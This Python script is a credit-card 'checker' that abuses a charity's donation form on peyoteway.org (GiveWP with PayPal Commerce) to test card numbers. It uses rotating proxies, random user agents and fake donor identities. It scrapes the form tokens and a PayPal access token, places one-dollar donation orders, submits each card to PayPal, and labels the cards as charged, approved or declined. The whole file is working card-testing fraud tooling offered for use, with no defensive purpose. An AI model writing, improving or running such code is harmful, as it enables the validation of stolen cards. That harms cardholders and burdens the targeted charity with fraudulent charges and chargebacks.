import requests
import base64
import re
import random
from faker import Faker
from user_agent import generate_user_agent
from requests_toolbelt.multipart.encoder import MultipartEncoder
from proxy_manager import get_proxy_dict

fake = Faker()

def get_pp_session():
    try:
        proxies = get_proxy_dict()
        session = requests.Session()
        user = generate_user_agent()
        session.headers.update({'User-Agent': user})
        
        headers = {
            'authority': 'peyoteway.org',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'accept-language': 'en-US,en;q=0.9',
            'user-agent': user,
        }
        
        response = session.get('https://peyoteway.org/sustainable-peyotism-donate/', headers=headers, timeout=20, proxies=proxies)
        
        id_form1_match = re.search(r'name="give-form-id-prefix" value="(.*?)"', response.text)
        id_form2_match = re.search(r'name="give-form-id" value="(.*?)"', response.text)
        nonce_match = re.search(r'name="give-form-hash" value="(.*?)"', response.text)
        enc_match = re.search(r'"data-client-token":"(.*?)"', response.text)
        
        if id_form1_match and id_form2_match and nonce_match and enc_match:
            enc = enc_match.group(1)
            dec = base64.b64decode(enc).decode('utf-8')
            au_match = re.search(r'"accessToken":"(.*?)"', dec)
            
            if au_match:
                return {
                    'session': session,
                    'id_form1': id_form1_match.group(1),
                    'id_form2': id_form2_match.group(1),
                    'nonce': nonce_match.group(1),
                    'access_token': au_match.group(1),
                    'user_agent': user,
                    'cookies': dict(session.cookies),
                    'proxies': proxies
                }
        return None
    except Exception as e:
        return None

def pp_check(ccx, session_data=None):
    try:
        ccx = ccx.strip()
        parts = ccx.split("|")
        if len(parts) != 4:
            return {'card': ccx, 'status': 'INVALID', 'message': 'Invalid format', 'approved': False}
        
        n = parts[0].strip()
        mm = parts[1].strip().zfill(2)
        yy = parts[2].strip()
        cvc = parts[3].strip()
        
        if len(yy) == 4:
            yy = yy[2:]
        elif len(yy) == 2:
            pass
        else:
            yy = yy[-2:] if len(yy) > 2 else yy.zfill(2)
        
        fresh = session_data if session_data else get_pp_session()
        if not fresh:
            return {'card': ccx, 'status': 'ERROR', 'message': 'Failed to get session', 'approved': False}
        
        session = requests.Session()
        user = fresh.get('user_agent', generate_user_agent())
        proxies = fresh.get('proxies')
        
        if fresh.get('cookies'):
            session.cookies.update(fresh['cookies'])
        
        id_form1 = fresh['id_form1']
        id_form2 = fresh['id_form2']
        nonce = fresh['nonce']
        au = fresh['access_token']
        
        headers = {
            'authority': 'peyoteway.org',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://peyoteway.org',
            'referer': 'https://peyoteway.org/sustainable-peyotism-donate/',
            'user-agent': user,
            'x-requested-with': 'XMLHttpRequest',
        }
        
        first_name = fake.first_name()
        last_name = fake.last_name()
        email = fake.email()
        
        data = {
            'give-honeypot': '',
            'give-form-id-prefix': id_form1,
            'give-form-id': id_form2,
            'give-form-title': 'Donate Now to Support Sustainable Peyotism',
            'give-current-url': 'https://peyoteway.org/sustainable-peyotism-donate/',
            'give-form-url': 'https://peyoteway.org/sustainable-peyotism-donate/',
            'give-form-minimum': '1.00',
            'give-form-maximum': '999999.99',
            'give-form-hash': nonce,
            'give-price-id': 'custom',
            'give-recurring-logged-in-only': '',
            'give-logged-in-only': '1',
            'give_recurring_donation_details': '{"is_recurring":false}',
            'give-amount': '1.00',
            'give-radio-donation-level': 'custom',
            'payment-mode': 'paypal-commerce',
            'give_first': first_name,
            'give_last': last_name,
            'give_email': email,
            'give_comment': '',
            'card_name': f'{first_name} {last_name}',
            'card_exp_month': '',
            'card_exp_year': '',
            'give_action': 'purchase',
            'give-gateway': 'paypal-commerce',
            'action': 'give_process_donation',
            'give_ajax': 'true',
        }
        
        session.post('https://peyoteway.org/nov2019wp/wp-admin/admin-ajax.php', headers=headers, data=data, timeout=20, proxies=proxies)
        
        mp_data = MultipartEncoder({
            'give-honeypot': (None, ''),
            'give-form-id-prefix': (None, id_form1),
            'give-form-id': (None, id_form2),
            'give-form-title': (None, 'Donate Now to Support Sustainable Peyotism'),
            'give-current-url': (None, 'https://peyoteway.org/sustainable-peyotism-donate/'),
            'give-form-url': (None, 'https://peyoteway.org/sustainable-peyotism-donate/'),
            'give-form-minimum': (None, '1.00'),
            'give-form-maximum': (None, '999999.99'),
            'give-form-hash': (None, nonce),
            'give-price-id': (None, 'custom'),
            'give-recurring-logged-in-only': (None, ''),
            'give-logged-in-only': (None, '1'),
            'give_recurring_donation_details': (None, '{"is_recurring":false}'),
            'give-amount': (None, '1.00'),
            'give-radio-donation-level': (None, 'custom'),
            'payment-mode': (None, 'paypal-commerce'),
            'give_first': (None, first_name),
            'give_last': (None, last_name),
            'give_email': (None, email),
            'give_comment': (None, ''),
            'card_name': (None, f'{first_name} {last_name}'),
            'card_exp_month': (None, ''),
            'card_exp_year': (None, ''),
            'give-gateway': (None, 'paypal-commerce'),
        })
        
        headers2 = {
            'authority': 'peyoteway.org',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': mp_data.content_type,
            'origin': 'https://peyoteway.org',
            'referer': 'https://peyoteway.org/sustainable-peyotism-donate/',
            'user-agent': user,
        }
        
        response = session.post(
            'https://peyoteway.org/nov2019wp/wp-admin/admin-ajax.php',
            params={'action': 'give_paypal_commerce_create_order'},
            headers=headers2,
            data=mp_data,
            timeout=25,
            proxies=proxies
        )
        
        tok = response.json().get('data', {}).get('id')
        if not tok:
            return {'card': ccx, 'status': 'ERROR', 'message': 'Failed to create order', 'approved': False}
        
        headers3 = {
            'authority': 'cors.api.paypal.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'authorization': f'Bearer {au}',
            'braintree-sdk-version': '3.32.0-payments-sdk-dev',
            'content-type': 'application/json',
            'origin': 'https://assets.braintreegateway.com',
            'referer': 'https://assets.braintreegateway.com/',
            'user-agent': user,
        }
        
        json_data = {
            'payment_source': {
                'card': {
                    'number': n,
                    'expiry': f'20{yy}-{mm}',
                    'security_code': cvc,
                    'attributes': {
                        'verification': {
                            'method': 'SCA_WHEN_REQUIRED',
                        },
                    },
                },
            },
            'application_context': {
                'vault': False,
            },
        }
        
        session.post(
            f'https://cors.api.paypal.com/v2/checkout/orders/{tok}/confirm-payment-source',
            headers=headers3,
            json=json_data,
            timeout=25,
            proxies=proxies
        )
        
        mp_data2 = MultipartEncoder({
            'give-honeypot': (None, ''),
            'give-form-id-prefix': (None, id_form1),
            'give-form-id': (None, id_form2),
            'give-form-title': (None, 'Donate Now to Support Sustainable Peyotism'),
            'give-current-url': (None, 'https://peyoteway.org/sustainable-peyotism-donate/'),
            'give-form-url': (None, 'https://peyoteway.org/sustainable-peyotism-donate/'),
            'give-form-minimum': (None, '1.00'),
            'give-form-maximum': (None, '999999.99'),
            'give-form-hash': (None, nonce),
            'give-price-id': (None, 'custom'),
            'give-recurring-logged-in-only': (None, ''),
            'give-logged-in-only': (None, '1'),
            'give_recurring_donation_details': (None, '{"is_recurring":false}'),
            'give-amount': (None, '1.00'),
            'give-radio-donation-level': (None, 'custom'),
            'payment-mode': (None, 'paypal-commerce'),
            'give_first': (None, first_name),
            'give_last': (None, last_name),
            'give_email': (None, email),
            'give_comment': (None, ''),
            'card_name': (None, f'{first_name} {last_name}'),
            'card_exp_month': (None, ''),
            'card_exp_year': (None, ''),
            'give-gateway': (None, 'paypal-commerce'),
        })
        
        headers4 = {
            'authority': 'peyoteway.org',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': mp_data2.content_type,
            'origin': 'https://peyoteway.org',
            'referer': 'https://peyoteway.org/sustainable-peyotism-donate/',
            'user-agent': user,
        }
        
        response = session.post(
            'https://peyoteway.org/nov2019wp/wp-admin/admin-ajax.php',
            params={'action': 'give_paypal_commerce_approve_order', 'order': tok},
            headers=headers4,
            data=mp_data2,
            timeout=25,
            proxies=proxies
        )
        
        text = response.text
        
        is_success = False
        try:
            resp_json = response.json()
            if resp_json.get('success') == True:
                actual_msg = 'Payment Successful'
                is_success = True
            elif 'data' in resp_json and 'error' in resp_json['data']:
                actual_msg = str(resp_json['data']['error'])[:80]
            else:
                actual_msg = text[:100] if len(text) > 100 else text
        except:
            actual_msg = text[:100] if len(text) > 100 else text
        
        if 'ORDER_NOT_APPROVED' in text:
            return {'card': ccx, 'status': 'DECLINED', 'message': 'ORDER_NOT_APPROVED', 'approved': False}
        elif 'UNPROCESSABLE_ENTITY' in text:
            return {'card': ccx, 'status': 'DECLINED', 'message': actual_msg, 'approved': False}
        elif is_success or ('"success":true' in text.replace(' ', '')):
            return {'card': ccx, 'status': 'CHARGED', 'message': actual_msg, 'approved': True}
        elif 'INSUFFICIENT_FUNDS' in text:
            return {'card': ccx, 'status': 'APPROVED', 'message': 'INSUFFICIENT_FUNDS', 'approved': True}
        elif 'CVV2_FAILURE' in text:
            return {'card': ccx, 'status': 'APPROVED', 'message': 'CVV2_FAILURE', 'approved': True}
        elif 'DO_NOT_HONOR' in text:
            return {'card': ccx, 'status': 'DECLINED', 'message': 'DO_NOT_HONOR', 'approved': False}
        elif 'GENERIC_DECLINE' in text:
            return {'card': ccx, 'status': 'DECLINED', 'message': 'GENERIC_DECLINE', 'approved': False}
        elif 'EXPIRED_CARD' in text:
            return {'card': ccx, 'status': 'DECLINED', 'message': 'EXPIRED_CARD', 'approved': False}
        elif 'LOST_OR_STOLEN' in text:
            return {'card': ccx, 'status': 'DECLINED', 'message': 'LOST_OR_STOLEN', 'approved': False}
        elif 'INVALID_ACCOUNT' in text or 'INVALID_OR_RESTRICTED_CARD' in text:
            return {'card': ccx, 'status': 'DECLINED', 'message': 'INVALID_ACCOUNT', 'approved': False}
        elif 'SUSPECTED_FRAUD' in text:
            return {'card': ccx, 'status': 'DECLINED', 'message': 'SUSPECTED_FRAUD', 'approved': False}
        elif 'TRANSACTION_NOT_PERMITTED' in text:
            return {'card': ccx, 'status': 'DECLINED', 'message': 'TRANSACTION_NOT_PERMITTED', 'approved': False}
        elif 'PAYMENT_DENIED' in text:
            return {'card': ccx, 'status': 'DECLINED', 'message': 'PAYMENT_DENIED', 'approved': False}
        elif 'ACCOUNT_CLOSED' in text or 'PAYER_ACCOUNT_LOCKED_OR_CLOSED' in text:
            return {'card': ccx, 'status': 'DECLINED', 'message': 'ACCOUNT_CLOSED', 'approved': False}
        else:
            return {'card': ccx, 'status': 'DECLINED', 'message': actual_msg, 'approved': False}
    
    except Exception as e:
        return {'card': ccx, 'status': 'ERROR', 'message': str(e)[:50], 'approved': False}
